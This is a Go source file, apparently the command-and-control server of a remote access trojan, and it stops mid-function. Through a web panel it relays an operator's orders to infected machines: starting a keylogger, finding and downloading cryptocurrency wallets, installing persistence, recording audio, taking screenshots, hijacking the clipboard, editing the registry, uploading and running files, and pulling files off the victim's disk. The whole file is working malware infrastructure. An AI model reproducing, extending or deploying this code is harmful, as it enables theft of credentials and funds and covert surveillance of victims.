// JANGAN DI JUALL NGENTODDDDDDDDDD
// JANGAN DI JUALL NGENTODDDDDDDDDD
// JANGAN DI JUALL NGENTODDDDDDDDDD
// JANGAN DI JUALL NGENTODDDDDDDDDD
// JANGAN DI JUALL NGENTODDDDDDDDDD
// JANGAN DI JUALL NGENTODDDDDDDDDD
// JANGAN DI JUALL NGENTODDDDDDDDDD
// JANGAN DI JUALL NGENTODDDDDDDDDD

package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type Client struct {
	ID          string    `json:"id"`
	Conn        net.Conn  `json:"-"`
	RemoteAddr  string    `json:"remote_addr"`
	ConnectedAt time.Time `json:"connected_at"`
	LastSeen    time.Time `json:"last_seen"`
	OS          string    `json:"os"`
	Hostname    string    `json:"hostname"`
	Status      string    `json:"status"`
	reader      *bufio.Reader
}

type Command struct {
	Type        string `json:"type"`
	Command     string `json:"command"`
	ClientID    string `json:"client_id"`
	Quality     string `json:"quality,omitempty"`
	Filename    string `json:"filename,omitempty"`
	Filesize    int64  `json:"filesize,omitempty"`
	TotalChunks int    `json:"total_chunks,omitempty"`
	ChunkIndex  int    `json:"chunk_index,omitempty"`
	ChunkData   string `json:"chunk_data,omitempty"`
	IsLast      bool   `json:"is_last,omitempty"`
	Path        string `json:"path,omitempty"`

	ProcessID     int    `json:"process_id,omitempty"`
	SearchTerm    string `json:"search_term,omitempty"`
	ProcessPath   string `json:"process_path,omitempty"`
	ProcessArgs   string `json:"process_args,omitempty"`
	Priority      string `json:"priority,omitempty"`
	ClipboardData string `json:"clipboard_data,omitempty"`

	RegistryHive      string `json:"registry_hive,omitempty"`
	RegistryKey       string `json:"registry_key,omitempty"`
	RegistryValue     string `json:"registry_value,omitempty"`
	RegistryValueType string `json:"registry_value_type,omitempty"`
	RegistryData      string `json:"registry_data,omitempty"`

	ConnectionPID int    `json:"connection_pid,omitempty"`
	LocalPort     int    `json:"local_port,omitempty"`
	RemotePort    int    `json:"remote_port,omitempty"`
	ScanTarget    string `json:"scan_target,omitempty"`
	StartPort     int    `json:"start_port,omitempty"`
	EndPort       int    `json:"end_port,omitempty"`

	AudioDuration int `json:"audio_duration,omitempty"`
	AudioDevice   int `json:"audio_device,omitempty"`

	PersistenceMethod string `json:"persistence_method,omitempty"`
	WalletPath        string `json:"wallet_path,omitempty"`

	// Troll fields
	TrollType string `json:"troll_type,omitempty"`
	Title     string `json:"title,omitempty"`
	Text      string `json:"text,omitempty"`
	URL       string `json:"url,omitempty"`

	// Script execution fields
	ScriptType    string `json:"script_type,omitempty"`
	ScriptContent string `json:"script_content,omitempty"`

	// File search fields
	Pattern string `json:"pattern,omitempty"`
}

type Response struct {
	Type     string `json:"type"`
	ClientID string `json:"client_id,omitempty"`
	Data     string `json:"data,omitempty"`
	Success  bool   `json:"success"`
	Image    string `json:"image,omitempty"`
	Message  string `json:"message,omitempty"`
}

type DownloadSession struct {
	Filename    string
	Chunks      map[int]string // Use map for better chunk management
	TotalChunks int
	Size        int64
	LastUpdate  time.Time
}

type Server struct {
	clients          map[string]*Client
	clientsMux       sync.RWMutex
	wsClients        map[*websocket.Conn]bool
	wsMux            sync.RWMutex
	upgrader         websocket.Upgrader
	downloadSessions map[string]*DownloadSession
	downloadMux      sync.RWMutex
}

func NewServer() *Server {
	return &Server{
		clients:          make(map[string]*Client),
		wsClients:        make(map[*websocket.Conn]bool),
		downloadSessions: make(map[string]*DownloadSession),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
			ReadBufferSize:  1024 * 1024 * 32, // 32MB read buffer
			WriteBufferSize: 1024 * 1024 * 32, // 32MB write buffer
		},
	}
}

var allowedIDs = map[string]bool{
	"razer": true,
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		http.ServeFile(w, r, "web/login.html")
		return
	}

	if r.Method == http.MethodPost {
		id := r.FormValue("id")

		if !allowedIDs[id] {
			http.Error(w, "Unauthorized: ID not allowed", http.StatusUnauthorized)
			log.Printf("Blocked login attempt with ID: %s", id)
			return
		}

		// Set session via cookie
		http.SetCookie(w, &http.Cookie{
			Name:     "session_id",
			Value:    id,
			Path:     "/",
			HttpOnly: true,
			MaxAge:   3600,
		})

		log.Printf("Login successful for ID: %s", id)
		http.Redirect(w, r, "/", http.StatusSeeOther)
	}
}

func sessionIDMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session_id")
		if err != nil || !allowedIDs[cookie.Value] {
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}
		next.ServeHTTP(w, r)
	}
}

// IMPROVED base64 validation and cleaning
func isValidBase64Char(c byte) bool {
	return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '='
}

func cleanBase64String(input string) string {
	var result strings.Builder
	result.Grow(len(input))

	for i := 0; i < len(input); i++ {
		c := input[i]
		if isValidBase64Char(c) {
			result.WriteByte(c)
		}
	}

	cleaned := result.String()

	// Ensure proper padding
	switch len(cleaned) % 4 {
	case 1:
		cleaned += "==="
	case 2:
		cleaned += "=="
	case 3:
		cleaned += "="
	}

	return cleaned
}

func validateBase64String(input string) error {
	// First clean the string
	cleaned := cleanBase64String(input)

	if len(cleaned) == 0 {
		return fmt.Errorf("empty base64 string")
	}

	// Check length is multiple of 4
	if len(cleaned)%4 != 0 {
		return fmt.Errorf("invalid base64 length: %d (not multiple of 4)", len(cleaned))
	}

	// Manual character validation (more reliable than regex)
	paddingCount := 0
	for i, c := range cleaned {
		if c == '=' {
			paddingCount++
			// Padding can only be at the end
			if i < len(cleaned)-2 {
				return fmt.Errorf("invalid padding at position %d", i)
			}
		} else if paddingCount > 0 {
			return fmt.Errorf("non-padding character after padding at position %d", i)
		} else if !isValidBase64Char(byte(c)) {
			return fmt.Errorf("invalid base64 character '%c' at position %d", c, i)
		}
	}

	// Check padding count
	if paddingCount > 2 {
		return fmt.Errorf("too much padding: %d characters", paddingCount)
	}

	// Test decode a small portion
	testSize := min(1000, len(cleaned))
	if testSize > 0 {
		// Make sure test portion has proper padding
		testStr := cleaned[:testSize]
		if testSize < len(cleaned) && testSize%4 != 0 {
			// Pad the test string to make it valid
			padNeeded := 4 - (testSize % 4)
			testStr += strings.Repeat("=", padNeeded)
		}

		_, err := base64.StdEncoding.DecodeString(testStr)
		if err != nil {
			return fmt.Errorf("base64 decode test failed: %v", err)
		}
	}

	return nil
}

func (s *Server) handleTCPClient(conn net.Conn) {
	defer conn.Close()

	// Set optimized buffer sizes for TCP connection
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetReadBuffer(1024 * 1024 * 16)  // 16MB read buffer
		tcpConn.SetWriteBuffer(1024 * 1024 * 16) // 16MB write buffer
		tcpConn.SetNoDelay(true)                 // Disable Nagle's algorithm
	}

	clientID := fmt.Sprintf("client_%d", time.Now().UnixNano())
	client := &Client{
		ID:          clientID,
		Conn:        conn,
		RemoteAddr:  conn.RemoteAddr().String(),
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
		Status:      "connected",
		reader:      bufio.NewReaderSize(conn, 1024*1024*8), // 8MB buffer
	}

	s.clientsMux.Lock()
	s.clients[clientID] = client
	s.clientsMux.Unlock()

	log.Printf("New client connected: %s from %s", clientID, client.RemoteAddr)
	s.broadcastClientUpdate()

	// Set initial read timeout
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	for {
		// Read until newline with larger buffer
		line, err := client.reader.ReadString('\n')
		if err != nil {
			log.Printf("Client %s disconnected: %v", clientID, err)
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		// Reset read timeout on each message
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		// Parse incoming message
		var msg map[string]interface{}
		if err := json.Unmarshal([]byte(line), &msg); err != nil {
			log.Printf("Error parsing message from %s: %v (message length: %d)", clientID, err, len(line))
			continue
		}

		// Handle different message types
		msgType, _ := msg["type"].(string)
		switch msgType {
		case "info":
			if hostname, ok := msg["hostname"].(string); ok {
				client.Hostname = hostname
			}
			if os, ok := msg["os"].(string); ok {
				client.OS = os
			}
			s.broadcastClientUpdate()

		case "response":
			// Forward response to web clients
			data, _ := msg["data"].(string)
			success, _ := msg["success"].(bool)
			response := Response{
				Type:     "command_response",
				ClientID: clientID,
				Data:     data,
				Success:  success,
			}
			s.broadcastToWeb(response)

		case "screenshot":
			// Forward screenshot to web clients - FIXED data handling
			image, _ := msg["image"].(string)
			success, _ := msg["success"].(bool)

			// Validate base64 data if present
			if success && len(image) > 0 {
				// Clean and validate base64
				cleanedImage := cleanBase64String(image)
				if err := validateBase64String(cleanedImage); err != nil {
					log.Printf("Invalid screenshot base64 from %s: %v", clientID, err)
					success = false
					image = ""
				} else {
					image = cleanedImage
					log.Printf("Valid screenshot from %s: %d bytes (base64)", clientID, len(image))
				}
			}

			response := Response{
				Type:     "screenshot",
				ClientID: clientID,
				Data:     image, // Use Data field for consistency
				Success:  success,
			}
			s.broadcastToWeb(response)

		case "wallet_scan_started":
			s.broadcastToWeb(msg)

		case "wallet_found":
			s.broadcastToWeb(msg)

		case "wallet_scan_complete":
			s.broadcastToWeb(msg)

		case "wallet_download_start":
			s.broadcastToWeb(msg)

		case "wallet_download_chunk":
			s.broadcastToWeb(msg)

		case "wallet_download_complete":
			s.broadcastToWeb(msg)

		case "persistence_result":
			s.broadcastToWeb(msg)

		case "persistence_status":
			s.broadcastToWeb(msg)
		case "audio_devices":
			s.broadcastToWeb(msg)

		case "audio_record_status":
			s.broadcastToWeb(msg)

		case "audio_record_started":
			s.broadcastToWeb(msg)

		case "audio_record_progress":
			s.broadcastToWeb(msg)

		case "audio_record_error":
			s.broadcastToWeb(msg)

		case "audio_file_start":
			s.broadcastToWeb(msg)

		case "audio_file_chunk":
			s.broadcastToWeb(msg)

		case "audio_record_complete":
			s.broadcastToWeb(msg)

		case "connections_list":
			s.broadcastToWeb(msg)

		case "connection_close_result":
			s.broadcastToWeb(msg)

		case "netstat_monitor_status":
			s.broadcastToWeb(msg)

		case "port_scan_started":
			s.broadcastToWeb(msg)

		case "port_scan_progress":
			s.broadcastToWeb(msg)

		case "port_found":
			s.broadcastToWeb(msg)

		case "port_scan_complete":
			s.broadcastToWeb(msg)

		case "port_scan_stopped":
			s.broadcastToWeb(msg)
		case "registry_read_result":
			s.broadcastToWeb(msg)

		case "registry_write_result":
			s.broadcastToWeb(msg)

		case "registry_delete_result":
			s.broadcastToWeb(msg)

		case "registry_keys_list":
			s.broadcastToWeb(msg)

		case "registry_values_list":
			s.broadcastToWeb(msg)

		case "registry_error":
			s.broadcastToWeb(msg)
		case "keylogger_status":
			s.broadcastToWeb(msg)

		case "keylog_data":
			s.broadcastToWeb(msg)

		case "keylog_update":
			s.broadcastToWeb(msg)

		case "keylog_clear":
			s.broadcastToWeb(msg)

		case "clipboard_data":
			s.broadcastToWeb(msg)

		case "clipboard_set_result":
			s.broadcastToWeb(msg)

		case "clipboard_monitor_status":
			s.broadcastToWeb(msg)

		case "clipboard_changed":
			s.broadcastToWeb(msg)

		case "processes_list":
			// Forward process list to web clients
			s.broadcastToWeb(msg)

		case "process_kill_result":
			// Forward kill result to web clients
			s.broadcastToWeb(msg)

		case "process_search_result":
			// Forward search result to web clients
			s.broadcastToWeb(msg)

		case "process_start_result":
			// Forward start result to web clients
			s.broadcastToWeb(msg)

		case "process_priority_result":
			// Forward priority result to web clients
			s.broadcastToWeb(msg)

		case "process_details":
			// Forward process details to web clients
			s.broadcastToWeb(msg)

		case "keepalive":
			client.LastSeen = time.Now()

		case "file_upload_ack", "file_upload_complete", "execute_response":
			// Forward file-related responses to web clients
			s.broadcastToWeb(msg)

		case "fm_drives":
			// Forward file manager drives response
			s.broadcastToWeb(msg)

		case "fm_files":
			// Forward file manager files response
			s.broadcastToWeb(msg)

		case "fm_operation_result":
			// Forward file manager operation results
			s.broadcastToWeb(msg)

		case "fm_download_start":
			// Handle download start
			s.handleDownloadStart(clientID, msg)

		case "fm_download_chunk":
			// Handle download chunk
			s.handleDownloadChunk(clientID, msg)

		case "fm_download_complete":
			// Handle download completion
			s.handleDownloadComplete(clientID, msg)

		case "troll_response":
			s.broadcastToWeb(msg)

		case "sysinfo_response":
			s.broadcastToWeb(msg)
		case "fm_search_result":
			s.broadcastToWeb(msg)
		case "fm_search_complete":
			s.broadcastToWeb(msg)
		case "script_response":
			s.broadcastToWeb(msg)
		case "password_recovery_complete":
			s.broadcastToWeb(msg)
		}
	}

	// Client disconnected
	s.clientsMux.Lock()
	delete(s.clients, clientID)
	s.clientsMux.Unlock()

	// Clean up any download sessions for this client
	s.downloadMux.Lock()
	delete(s.downloadSessions, clientID)
	s.downloadMux.Unlock()

	log.Printf("Client disconnected: %s", clientID)
	s.broadcastClientUpdate()
}

func (s *Server) handleDownloadStart(clientID string, msg map[string]interface{}) {
	filename, _ := msg["filename"].(string)
	size, _ := msg["size"].(float64)

	s.downloadMux.Lock()
	s.downloadSessions[clientID] = &DownloadSession{
		Filename:    filename,
		Chunks:      make(map[int]string),
		Size:        int64(size),
		LastUpdate:  time.Now(),
		TotalChunks: 0,
	}
	s.downloadMux.Unlock()

	log.Printf("Starting download session for %s: %s (%d bytes)", clientID, filename, int64(size))

	// Forward to web clients
	s.broadcastToWeb(msg)
}

func (s *Server) handleDownloadChunk(clientID string, msg map[string]interface{}) {
	chunkData, _ := msg["chunk_data"].(string)
	chunkIndex, _ := msg["chunk_index"].(float64)
	totalChunks, _ := msg["total_chunks"].(float64)
	isLast, _ := msg["is_last"].(bool)

	log.Printf("Processing chunk %d/%d for %s (original size: %d bytes)",
		int(chunkIndex)+1, int(totalChunks), clientID, len(chunkData))

	// Basic validation - ensure chunk is not empty
	if len(chunkData) == 0 {
		log.Printf("Empty chunk %d from %s", int(chunkIndex), clientID)
		errorMsg := map[string]interface{}{
			"type":      "fm_download_complete",
			"client_id": clientID,
			"success":   false,
			"error":     fmt.Sprintf("Empty chunk %d", int(chunkIndex)),
		}
		s.broadcastToWeb(errorMsg)
		return
	}

	// Clean the chunk (remove any unwanted characters)
	cleanedChunk := cleanBase64String(chunkData)

	// For intermediate chunks, ensure no padding (padding only allowed on last chunk)
	if !isLast {
		// Remove any padding from intermediate chunks
		for len(cleanedChunk) > 0 && cleanedChunk[len(cleanedChunk)-1] == '=' {
			cleanedChunk = cleanedChunk[:len(cleanedChunk)-1]
		}
	}

	log.Printf("Chunk %d: original=%d bytes, cleaned=%d bytes, is_last=%v",
		int(chunkIndex), len(chunkData), len(cleanedChunk), isLast)

	s.downloadMux.Lock()
	session, exists := s.downloadSessions[clientID]
	if exists {
		session.Chunks[int(chunkIndex)] = cleanedChunk
		session.TotalChunks = int(totalChunks)
		session.LastUpdate = time.Now()
	}
	s.downloadMux.Unlock()

	if !exists {
		log.Printf("No download session found for client %s", clientID)
		return
	}

	log.Printf("Stored chunk %d/%d for %s (size: %d bytes)",
		int(chunkIndex)+1, int(totalChunks), clientID, len(cleanedChunk))

	// Forward chunk to web clients immediately
	msg["client_id"] = clientID
	msg["chunk_data"] = cleanedChunk // Use cleaned chunk
	s.broadcastToWeb(msg)

	// Check if we have all chunks
	if isLast || len(session.Chunks) >= int(totalChunks) {
		log.Printf("All chunks received for %s, finalizing download", clientID)
		s.finalizeDownload(clientID, session)
	}
}

func (s *Server) finalizeDownload(clientID string, session *DownloadSession) {
	log.Printf("Finalizing download for %s: %d chunks, expected %d", clientID, len(session.Chunks), session.TotalChunks)

	// Validate we have all chunks
	for i := 0; i < session.TotalChunks; i++ {
		if chunk, exists := session.Chunks[i]; !exists {
			log.Printf("Missing chunk %d for download %s", i, clientID)
			errorMsg := map[string]interface{}{
				"type":      "fm_download_complete",
				"client_id": clientID,
				"success":   false,
				"error":     fmt.Sprintf("Missing chunk %d", i),
			}
			s.broadcastToWeb(errorMsg)
			return
		} else if len(chunk) == 0 {
			log.Printf("Empty chunk %d for download %s", i, clientID)
			errorMsg := map[string]interface{}{
				"type":      "fm_download_complete",
				"client_id": clientID,
				"success":   false,
				"error":     fmt.Sprintf("Empty chunk %d", i),
			}
			s.broadcastToWeb(errorMsg)
			return
		}
	}

	// Combine chunks in correct order
	var combinedData strings.Builder
	estimatedSize := int(session.Size) * 4 / 3 // Estimate base64 size
	combinedData.Grow(estimatedSize)

	for i := 0; i < session.TotalChunks; i++ {
		chunk := session.Chunks[i]
		combinedData.WriteString(chunk)
	}

	finalData := combinedData.String()
	if len(finalData) == 0 {
		log.Printf("No data reconstructed for download %s", clientID)
		errorMsg := map[string]interface{}{
			"type":      "fm_download_complete",
			"client_id": clientID,
			"success":   false,
			"error":     "No data reconstructed",
		}
		s.broadcastToWeb(errorMsg)
		return
	}

	log.Printf("Combined base64 length: %d, validating final data...", len(finalData))

	// Final validation of combined data
	cleanedFinal := cleanBase64String(finalData)
	if err := validateBase64String(cleanedFinal); err != nil {
		log.Printf("Final base64 validation failed for %s: %v", clientID, err)

		// Try to find the problem location
		problemLocation := -1
		for i := 0; i < len(finalData); i++ {
			if !isValidBase64Char(finalData[i]) {
				problemLocation = i
				break
			}
		}

		errorMsg := map[string]interface{}{
			"type":      "fm_download_complete",
			"client_id": clientID,
			"success":   false,
			"error":     fmt.Sprintf("Base64 validation failed at position %d: %v", problemLocation, err),
		}
		s.broadcastToWeb(errorMsg)
		return
	}

	// Final decode test
	decodedData, err := base64.StdEncoding.DecodeString(cleanedFinal)
	if err != nil {
		log.Printf("Final base64 decode failed for %s: %v", clientID, err)
		errorMsg := map[string]interface{}{
			"type":      "fm_download_complete",
			"client_id": clientID,
			"success":   false,
			"error":     fmt.Sprintf("Final decode failed: %v", err),
		}
		s.broadcastToWeb(errorMsg)
		return
	}

	// Save the file with timestamp and client ID
	filename := fmt.Sprintf("%s_%d_%s", clientID, time.Now().Unix(), session.Filename)
	s.saveDownloadedFile(filename, cleanedFinal)

	// Send completion message to web clients
	completeMsg := map[string]interface{}{
		"type":       "fm_download_complete",
		"client_id":  clientID,
		"success":    true,
		"filename":   session.Filename,
		"saved_name": filename,
		"size":       len(decodedData),
	}
	s.broadcastToWeb(completeMsg)

	log.Printf("Download completed successfully for %s: %s (%d bytes decoded)", clientID, filename, len(decodedData))

	// Clean up session
	s.downloadMux.Lock()
	delete(s.downloadSessions, clientID)
	s.downloadMux.Unlock()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func (s *Server) handleDownloadComplete(clientID string, msg map[string]interface{}) {
	success, _ := msg["success"].(bool)

	if success {
		s.downloadMux.Lock()
		session, exists := s.downloadSessions[clientID]
		s.downloadMux.Unlock()

		if exists && len(session.Chunks) >= session.TotalChunks {
			s.finalizeDownload(clientID, session)
		} else {
			log.Printf("Download session not found or incomplete for completion: %s", clientID)
		}
	} else {
		// Forward error message
		msg["client_id"] = clientID
		s.broadcastToWeb(msg)

		// Clean up failed session
		s.downloadMux.Lock()
		delete(s.downloadSessions, clientID)
		s.downloadMux.Unlock()
	}
}

func (s *Server) sendCommandToClient(clientID, command string) error {
	s.clientsMux.RLock()
	client, exists := s.clients[clientID]
	s.clientsMux.RUnlock()

	if !exists {
		return fmt.Errorf("client not found")
	}

	cmd := map[string]string{
		"type":    "command",
		"command": command,
	}

	data, _ := json.Marshal(cmd)
	data = append(data, '\n')

	// Set write deadline
	client.Conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	_, err := client.Conn.Write(data)
	return err
}

func (s *Server) forwardToClient(clientID string, message interface{}) error {
	s.clientsMux.RLock()
	client, exists := s.clients[clientID]
	s.clientsMux.RUnlock()

	if !exists {
		return fmt.Errorf("client not found")
	}

	data, _ := json.Marshal(message)
	data = append(data, '\n')

	// Set write deadline
	client.Conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	_, err := client.Conn.Write(data)
	return err
}

func (s *Server) sendScreenshotCommand(clientID, cmdType, quality string) error {
	s.clientsMux.RLock()
	client, exists := s.clients[clientID]
	s.clientsMux.RUnlock()

	if !exists {
		return fmt.Errorf("client not found")
	}

	cmd := map[string]string{
		"type": cmdType,
	}

	if quality != "" {
		cmd["quality"] = quality
	}

	data, _ := json.Marshal(cmd)
	data = append(data, '\n')

	// Set write deadline
	client.Conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	_, err := client.Conn.Write(data)
	if err != nil {
		log.Printf("Error sending screenshot command to %s: %v", clientID, err)
	}
	return err
}

func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	// Set larger message size limit (50MB for large screenshots)
	conn.SetReadLimit(50 * 1024 * 1024)

	s.wsMux.Lock()
	s.wsClients[conn] = true
	s.wsMux.Unlock()

	// Send current clients list
	s.sendClientsList(conn)

	// Send initial ping to keep connection alive
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		return nil
	})

	// Start ping ticker
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	go func() {
		for {
			select {
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					log.Printf("WebSocket ping failed: %v", err)
					return
				}
			}
		}
	}()

	// Set initial read deadline
	conn.SetReadDeadline(time.Now().Add(120 * time.Second))

	for {
		var cmd Command
		err := conn.ReadJSON(&cmd)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		switch cmd.Type {
		case "send_command":
			err := s.sendCommandToClient(cmd.ClientID, cmd.Command)
			response := Response{
				Type:     "command_sent",
				ClientID: cmd.ClientID,
				Success:  err == nil,
			}
			if err != nil {
				response.Data = err.Error()
			}
			conn.WriteJSON(response)

		case "get_connections":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "get_connections",
			})

		case "close_connection":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":        "close_connection",
				"pid":         cmd.ConnectionPID,
				"local_port":  cmd.LocalPort,
				"remote_port": cmd.RemotePort,
			})

		case "scan_wallets":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "scan_wallets",
			})

		case "download_wallet":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "download_wallet",
				"path": cmd.WalletPath,
			})

		case "install_persistence":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":   "install_persistence",
				"method": cmd.PersistenceMethod,
			})

		case "remove_persistence":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "remove_persistence",
			})

		case "check_persistence":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "check_persistence",
			})

		case "get_audio_devices":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "get_audio_devices",
			})

		case "start_audio_record":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":     "start_audio_record",
				"duration": cmd.AudioDuration,
				"device":   cmd.AudioDevice,
			})

		case "stop_audio_record":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "stop_audio_record",
			})

		case "start_netstat_monitor":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "start_netstat_monitor",
			})

		case "stop_netstat_monitor":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "stop_netstat_monitor",
			})

		case "scan_ports":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":       "scan_ports",
				"target":     cmd.ScanTarget,
				"start_port": cmd.StartPort,
				"end_port":   cmd.EndPort,
			})

		case "stop_port_scan":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "stop_port_scan",
			})

		case "registry_read":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":  "registry_read",
				"hive":  cmd.RegistryHive,
				"key":   cmd.RegistryKey,
				"value": cmd.RegistryValue,
			})

		case "registry_write":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":       "registry_write",
				"hive":       cmd.RegistryHive,
				"key":        cmd.RegistryKey,
				"value":      cmd.RegistryValue,
				"value_type": cmd.RegistryValueType,
				"data":       cmd.RegistryData,
			})

		case "registry_delete":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":  "registry_delete",
				"hive":  cmd.RegistryHive,
				"key":   cmd.RegistryKey,
				"value": cmd.RegistryValue,
			})

		case "registry_enum_keys":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "registry_enum_keys",
				"hive": cmd.RegistryHive,
				"key":  cmd.RegistryKey,
			})

		case "registry_enum_values":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "registry_enum_values",
				"hive": cmd.RegistryHive,
				"key":  cmd.RegistryKey,
			})

		case "start_keylogger":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "start_keylogger",
			})

		case "stop_keylogger":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "stop_keylogger",
			})

		case "get_keylog":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "get_keylog",
			})

		case "clear_keylog":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "clear_keylog",
			})
		case "get_clipboard":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "get_clipboard",
			})

		case "set_clipboard":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "set_clipboard",
				"data": cmd.ClipboardData,
			})

		case "start_clipboard_monitor":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "start_clipboard_monitor",
			})

		case "stop_clipboard_monitor":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "stop_clipboard_monitor",
			})
		case "get_processes":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "get_processes",
			})

		case "kill_process":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "kill_process",
				"pid":  cmd.ProcessID,
			})

		case "search_process":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "search_process",
				"term": cmd.SearchTerm,
			})

		case "start_process":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "start_process",
				"path": cmd.ProcessPath,
				"args": cmd.ProcessArgs,
			})

		case "set_process_priority":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":     "set_process_priority",
				"pid":      cmd.ProcessID,
				"priority": cmd.Priority,
			})

		case "get_process_details":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "get_process_details",
				"pid":  cmd.ProcessID,
			})

		case "start_screenshot":
			log.Printf("Starting screenshot with quality: %s for client: %s", cmd.Quality, cmd.ClientID)
			err := s.sendScreenshotCommand(cmd.ClientID, "start_screenshot", cmd.Quality)
			if err != nil {
				log.Printf("Error starting screenshot: %v", err)
			}

		case "stop_screenshot":
			log.Printf("Stopping screenshot for client: %s", cmd.ClientID)
			err := s.sendScreenshotCommand(cmd.ClientID, "stop_screenshot", "")
			if err != nil {
				log.Printf("Error stopping screenshot: %v", err)
			}

		case "get_screenshot":
			err := s.sendScreenshotCommand(cmd.ClientID, "get_screenshot", "")
			if err != nil {
				log.Printf("Error getting screenshot: %v", err)
			}

		case "get_clients":
			s.sendClientsList(conn)

		case "ping":
			// Handle ping from client - just respond with pong
			pongMsg := map[string]interface{}{
				"type":      "pong",
				"timestamp": time.Now().UnixMilli(),
			}
			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			conn.WriteJSON(pongMsg)

		case "file_upload_start":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":         "file_upload_start",
				"filename":     cmd.Filename,
				"filesize":     cmd.Filesize,
				"total_chunks": cmd.TotalChunks,
			})

		case "file_chunk":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":        "file_chunk",
				"chunk_index": cmd.ChunkIndex,
				"chunk_data":  cmd.ChunkData,
				"is_last":     cmd.IsLast,
			})

		case "execute_file":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":     "execute_file",
				"filename": cmd.Filename,
			})

		case "fm_get_drives":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "fm_get_drives",
			})

		case "fm_list_files":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "fm_list_files",
				"path": cmd.Path,
			})

		case "fm_execute":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "fm_execute",
				"path": cmd.Path,
			})

		case "fm_zip_folder":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "fm_zip_folder",
				"path": cmd.Path,
			})

		case "fm_download_file":
			log.Printf("Starting download for client %s: %s", cmd.ClientID, cmd.Path)
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "fm_download_file",
				"path": cmd.Path,
			})

		case "fm_upload_start":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":         "fm_upload_start",
				"path":         cmd.Path,
				"filename":     cmd.Filename,
				"filesize":     cmd.Filesize,
				"total_chunks": cmd.TotalChunks,
			})

		case "fm_upload_chunk":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":        "fm_upload_chunk",
				"chunk_index": cmd.ChunkIndex,
				"chunk_data":  cmd.ChunkData,
				"is_last":     cmd.IsLast,
			})

